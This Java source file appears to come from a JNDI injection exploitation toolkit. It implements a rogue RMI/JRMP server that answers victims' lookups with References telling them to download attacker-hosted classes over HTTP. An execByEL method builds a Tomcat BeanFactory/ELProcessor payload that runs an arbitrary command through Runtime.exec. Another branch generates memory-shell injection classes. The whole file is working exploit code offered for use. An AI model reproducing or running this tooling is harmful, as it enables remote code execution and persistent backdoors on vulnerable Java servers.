package com.qi4l.jndi;


import com.qi4l.jndi.gadgets.Config.Config;
import com.qi4l.jndi.gadgets.utils.Gadgets;
import com.qi4l.jndi.gadgets.utils.InjShell;
import com.qi4l.jndi.gadgets.utils.Reflections;
import com.qi4l.jndi.gadgets.utils.handle.ClassNameHandler;
import com.sun.jndi.rmi.registry.ReferenceWrapper;
import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;
import org.apache.naming.ResourceRef;
import sun.rmi.server.UnicastServerRef;
import sun.rmi.transport.TransportConstants;

import javax.naming.Reference;
import javax.naming.StringRefAddr;
import javax.net.ServerSocketFactory;
import java.io.*;
import java.lang.reflect.Field;
import java.net.*;
import java.rmi.MarshalException;
import java.rmi.server.ObjID;
import java.rmi.server.RemoteObject;
import java.rmi.server.UID;
import java.util.Arrays;

import static com.qi4l.jndi.gadgets.Config.Config.*;
import static org.fusesource.jansi.Ansi.ansi;


/**
 * Generic JRMP listener
 * <p>
 * JRMP Listener that will respond to RMI lookups with a Reference that specifies a remote object factory.
 * <p>
 * This technique was mitigated against by no longer allowing remote codebases in references by default in Java 8u121.
 *
 * @author mbechler
 */
@SuppressWarnings({
        "restriction"
})
public class RMIServer extends InMemoryOperationInterceptor implements Runnable {

    private final ServerSocket ss;
    private final Object       waitLock = new Object();
    private final URL          classpathUrl;
    private       boolean      exit;


    public RMIServer(int port, URL classpathUrl) throws IOException {
        this.classpathUrl = classpathUrl;
        this.ss = ServerSocketFactory.getDefault().createServerSocket(port);
    }

    public static void start() {
        String url = "http://" + ip + ":" + rmiPort;

        try {
            System.out.println(ansi().render("@|green [+]|@ RMI  Server Start Listening on >>" + rmiPort + "..."));
            RMIServer c = new RMIServer(rmiPort, new URL(url));
            c.run();
        } catch (Exception e) {
            System.err.println("Listener error");
            e.printStackTrace(System.err);
        }
    }

    public static ResourceRef execByEL() {

        ResourceRef ref = new ResourceRef("javax.el.ELProcessor", null, "", "", true, "org.apache.naming.factory.BeanFactory", null);
        ref.add(new StringRefAddr("forceString", "x=eval"));
        ref.add(new StringRefAddr("x", String.format(
                "\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(" +
                        "\"java.lang.Runtime.getRuntime().exec('%s')\"" +
                        ")",
                Config.command
        )));

        return ref;
    }

    private static void handleDGC(ObjectInputStream ois) throws IOException, ClassNotFoundException {
        ois.readInt(); // method
        ois.readLong(); // hash
        System.err.println("Is DGC call for " + Arrays.toString((ObjID[]) ois.readObject()));
    }

    /**
     *
     */
    public void close() {
        this.exit = true;
        try {
            this.ss.close();
        } catch (IOException ignored) {
        }
        synchronized (this.waitLock) {
            this.waitLock.notify();
        }
    }

    @Override
    public void run() {
        try {
            Socket s = null;
            try {
                while (!this.exit && (s = this.ss.accept()) != null) {
                    try {
                        s.setSoTimeout(5000);
                        InetSocketAddress remote = (InetSocketAddress) s.getRemoteSocketAddress();
                        System.err.println("[+] Have connection from " + remote);

                        InputStream is    = s.getInputStream();
                        InputStream bufIn = is.markSupported() ? is : new BufferedInputStream(is);

                        // Read magic (or HTTP wrapper)
                        bufIn.mark(4);
                        try (DataInputStream in = new DataInputStream(bufIn)) {
                            int magic = in.readInt();

                            short version = in.readShort();
                            if (magic != TransportConstants.Magic || version != TransportConstants.Version) {
                                s.close();
                                continue;
                            }

                            OutputStream         sockOut = s.getOutputStream();
                            BufferedOutputStream bufOut  = new BufferedOutputStream(sockOut);
                            try (DataOutputStream out = new DataOutputStream(bufOut)) {

                                byte protocol = in.readByte();
                                switch (protocol) {
                                    case TransportConstants.StreamProtocol:
                                        out.writeByte(TransportConstants.ProtocolAck);
                                        if (remote.getHostName() != null) {
                                            out.writeUTF(remote.getHostName());
                                        } else {
                                            out.writeUTF(remote.getAddress().toString());
                                        }
                                        out.writeInt(remote.getPort());
                                        out.flush();
                                        in.readUTF();
                                        in.readInt();
                                    case TransportConstants.SingleOpProtocol:
                                        doMessage(s, in, out);
                                        break;
                                    default:
                                    case TransportConstants.MultiplexProtocol:
                                        System.err.println("Unsupported protocol");
                                        s.close();
                                        continue;
                                }

                                bufOut.flush();
                                out.flush();
                            }
                        }
                    } catch (InterruptedException e) {
                        return;
                    } catch (Exception e) {
                        e.printStackTrace(System.err);
                    } finally {
                        System.err.println("Closing connection");
                        s.close();
                    }

                }

            } finally {
                if (s != null) {
                    s.close();
                }
                if (this.ss != null) {
                    this.ss.close();
                }
            }

        } catch (SocketException ignored) {
        } catch (Exception e) {
            e.printStackTrace(System.err);
        }
    }

    private void doMessage(Socket s, DataInputStream in, DataOutputStream out) throws Exception {
        System.err.println("[+] RMI服务器 >> 正在读取信息");

        int op = in.read();

        switch (op) {
            case TransportConstants.Call:
                // service incoming RMI call
                doCall(in, out);
                break;

            case TransportConstants.Ping:
                // send ack for ping
                out.writeByte(TransportConstants.PingAck);
                break;

            case TransportConstants.DGCAck:
                UID.read(in);
                break;

            default:
                throw new IOException(" RMI  服务器  >> 无法识别：" + op);
        }

        s.close();
    }

    private void doCall(DataInputStream in, DataOutputStream out) throws Exception {
        ObjectInputStream ois = new ObjectInputStream(in) {

            @Override
            protected Class<?> resolveClass(ObjectStreamClass desc) throws IOException {
                if ("[Ljava.rmi.server.ObjID;".equals(desc.getName())) {
                    return ObjID[].class;
                } else if ("java.rmi.server.ObjID".equals(desc.getName())) {
                    return ObjID.class;
                } else if ("java.rmi.server.UID".equals(desc.getName())) {
                    return UID.class;
                } else if ("java.lang.String".equals(desc.getName())) {
                    return String.class;
                }
                throw new IOException(" RMI  服务器  >> 无法读取 Object");
            }
        };

        ObjID read;
        try {
            read = ObjID.read(ois);
        } catch (java.io.IOException e) {
            throw new MarshalException(" RMI  服务器  >> 无法读取 ObjID", e);
        }

        if (read.hashCode() == 2) {
            // DGC
            handleDGC(ois);
        } else if (read.hashCode() == 0) {
            if (handleRMI(ois, out)) {
                synchronized (this.waitLock) {
                    this.waitLock.notifyAll();
                }
            }
        }

    }

    private boolean handleRMI(ObjectInputStream ois, DataOutputStream out) throws Exception {
        int method = ois.readInt(); // method
        ois.readLong(); // hash

        if (method != 2) { // lookup
            return false;
        }

        String object = (String) ois.readObject();
        System.out.println(ansi().render("@|green [+]|@ RMI服务器 >> RMI 查询" + object + " " + method));
        out.writeByte(TransportConstants.Return); // transport op
        try (ObjectOutputStream oos = new MarshalOutputStream(out, this.classpathUrl)) {

            oos.writeByte(TransportConstants.NormalReturn);
            new UID().write(oos);

            //反射调用的类名
            ReferenceWrapper rw = Reflections.createWithoutConstructor(ReferenceWrapper.class);

            if (object.startsWith("Local")) {
                System.out.println(ansi().render("@|green [+]|@ RMI 服务器  >> 发送本地类加载引用"));
                System.out.println("-------------------------------------- RMI Local  Refenrence Links --------------------------------------");
                String[]    cmd       = object.split(" ");
                final Class EchoClass = Class.forName(ClassNameHandler.searchClassByName(cmd[1]));
                Reflections.setFieldValue(rw, "wrappee", EchoClass);
            } else if (object.startsWith("E-")) {
                String      object1    = object.substring(object.indexOf('-') + 1);
                final Class EchoClass  = Class.forName(ClassNameHandler.searchClassByName(object1));
                String      className  = EchoClass.getName();
                String      className1 = className.replaceAll("\\.", "/");
                String      turl       = "http://" + ip + ":" + httpPort + "/" + className1 + ".class";
                String      classPath  = className + ".class";
                System.out.println(ansi().render("@|green [+]|@ RMI 服务器  >> 向目标发送 stub >> %s", turl));
                System.out.println("-------------------------------------- RMI Remote Refenrence Links --------------------------------------");
                Reflections.setFieldValue(rw, "wrappee", new Reference("Foo", classPath, turl));
            } else if (object.startsWith("M-")) {
                //M-EX-MS-RFMSFromThreadF-bx#params
                String   object1 = object.substring(object.indexOf('-') + 1);
                String[] parts   = object1.split("#");
                String[] parts1  = parts[1].split(" ");
                InjShell.init(parts1);
                String className  = Gadgets.createClassB(parts[0]);
                String className1 = className.replaceAll("\\.", "/");
                String turl       = "http://" + ip + ":" + httpPort + "/" + className1 + ".class";
                String className2 = className1.substring(className1.lastIndexOf('/') + 1);
                System.out.println(ansi().render("@|green [+]|@ RMI 服务器  >> 向目标发送 stub >> %s", turl));
                System.out.println("-------------------------------------- RMI Remote Refenrence Links --------------------------------------");
                Reflections.setFieldValue(rw, "wrappee", new Reference("Foo", className2, turl));
            }

            Field refF = RemoteObject.class.getDeclaredField("ref");
            refF.setAccessible(true);
            refF.set(rw, new UnicastServerRef(12345));

            oos.writeObject(rw);

            oos.flush();
            out.flush();
        }
        return true;
    }

    static final class MarshalOutputStream extends ObjectOutputStream {

        private final URL sendUrl;


        public MarshalOutputStream(OutputStream out, URL u) throws IOException {
            super(out);
            this.sendUrl = u;
        }


        @Override
        protected void annotateClass(Class<?> cl) throws IOException {
            if (this.sendUrl != null) {
                writeObject(this.sendUrl.toString());
            } else if (!(cl.getClassLoader() instanceof URLClassLoader)) {
                writeObject(null);
            } else {
                URL[]         us = ((URLClassLoader) cl.getClassLoader()).getURLs();
                StringBuilder cb = new StringBuilder();

                for (URL u : us) {
                    cb.append(u.toString());
                }
                writeObject(cb.toString());
            }
        }


        /**
         * Serializes a location from which to load the specified class.
         */
        @Override
        protected void annotateProxyClass(Class<?> cl) throws IOException {
            annotateClass(cl);
        }
    }
}
